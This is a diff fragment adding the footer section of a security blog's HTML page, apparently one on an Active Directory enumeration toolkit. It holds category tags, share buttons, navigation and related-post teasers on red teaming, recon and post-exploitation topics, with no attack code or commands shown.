+      <a href="/https://dcodezero.github.io/categories/#red-team" class="page__taxonomy-item p-category" rel="tag">Red-team</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/categories/#tools" class="page__taxonomy-item p-category" rel="tag">Tools</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?via=Dcodezero&text=AD+Enumeration+Toolkit%3A+Scripts+I+Actually+Use%20%2Fhttps%3A%2F%2Fdcodezero.github.io%2Ftools%2Fred-team%2Fad-enumeration-toolkit%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdcodezero.github.io%2F%2Fhttps%3A%2F%2Fdcodezero.github.io%2Ftools%2Fred-team%2Fad-enumeration-toolkit%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://dcodezero.github.io//https://dcodezero.github.io/tools/red-team/ad-enumeration-toolkit/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/https://dcodezero.github.io/tools/red-team/recon-automation-scripts/" class="pagination--pager" title="External Recon Automation: Scripts That Save Hours">Previous</a>
+    
+    
+      <a href="/https://dcodezero.github.io/ai-security/practical-ai-red-teaming-techniques/" class="pagination--pager" title="Practical AI Red Teaming: Hands-On Attack Techniques and Tooling">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/ai-red-team-practical.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/ai-security/practical-ai-red-teaming-techniques/" rel="permalink">Practical AI Red Teaming: Hands-On Attack Techniques and Tooling
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          18 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is where abstract vulnerabilities become concrete exploits.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/tools-scripts.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/tools/red-team/recon-automation-scripts/" rel="permalink">External Recon Automation: Scripts That Save Hours
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/tools-scripts.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/tools/red-team/post-exploitation-scripts/" rel="permalink">Post-Exploitation Scripts: Persistence, Pivoting &amp; Data Collection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Scripts for maintaining access - credential harvesting, persistence mechanisms, lateral movement, and data exfiltration techniques.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/ai-red-team-intro.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/ai-security/red-team/introduction-to-ai-red-teaming/" rel="permalink">Introduction to AI Red Teaming: Breaking Machine Learning Systems
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          10 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This post establishes the foundational concepts of AI red teaming, dissects the threat landscape, and provides a technical framework for understanding how mo...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+ 
+  
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+           <!-- Add this CSS to your custom stylesheet (_sass or assets/css/main.scss) -->
+   <style>
+    .subscribe-button {
+      display: inline-block;
+      padding: 12px 24px;
+      background: transparent;
+      border: 2px solid #39ff14;
+      color: #39ff14;
+      text-decoration: none;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: bold;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .subscribe-button:hover {
+      background: #39ff14;
+      color: #000;
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
+    }
+    
+    .subscribe-button::before {
+      content: '>';
+      margin-right: 8px;
+      display: inline-block;
+    }
+    
+    /* Optional: Add animation */
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(57, 255, 20, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0); }
+    }
+    
+    .subscribe-button {
+      animation: pulse 2s infinite;
+    }
+    </style>
+    
+    <!-- Add this HTML where you want the button to appear -->
+    <div style="text-align: center; margin: 30px 0;">
+      <a href="/helpedyou/" class="subscribe-button">Join The Network</a>
+    </div>
+
+<div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/https://dcodezero.github.io/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+
+<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">Dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+
+      </footer>
+    </div>
+
+    
+  <script src="/https://dcodezero.github.io/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
